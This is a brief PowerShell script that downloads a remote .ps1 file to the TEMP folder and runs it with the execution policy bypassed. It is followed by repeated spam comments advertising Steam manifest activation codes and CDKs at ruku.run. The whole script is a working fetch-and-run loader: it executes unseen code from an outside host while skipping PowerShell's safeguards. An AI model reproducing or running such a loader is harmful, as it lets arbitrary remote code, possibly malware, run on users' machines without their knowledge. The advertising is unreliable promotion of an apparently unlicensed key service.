$ErrorActionPreference = 'Stop'
$url = 'https://d10.tfdl.net/public/2026-06-13/ad7e81b6-533b-4189-95ed-2ce62b9aecbc/a.ps1'
$out = Join-Path $env:TEMP '1.ps1'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $out
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $out
#   ---------business Buy CDK to Visit https://ruku.run------------------
# Need Steam manifest activation codes? Visit https://ruku.run
# Need Steam manifest activation codes? Visit https://ruku.run
# Need Steam manifest activation codes? Visit https://ruku.run
# Need Steam manifest activation codes? Visit https://ruku.run